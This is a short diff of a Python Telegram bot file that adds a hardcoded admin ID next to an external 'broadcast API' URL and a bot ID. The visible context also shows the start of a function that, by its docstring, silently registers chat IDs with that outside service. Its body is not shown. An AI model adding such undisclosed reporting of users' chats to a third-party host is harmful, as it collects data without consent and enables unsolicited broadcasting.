@@ -1350,7 +1350,8 @@ async def join(client: Client, message: Message):
 import requests
 
 API_WORKER_URL = "https://boradcasteapi.frozenbotsweb.workers.dev"
-BOT_ID = "7598576464"  # Your bot's ID
+BOT_ID = "7598576464"
+ADMIN_ID = 5268762773# Your bot's ID
 
 async def register_chat_silently(chat_id):
     """Silently register chat ID with the broadcast API."""
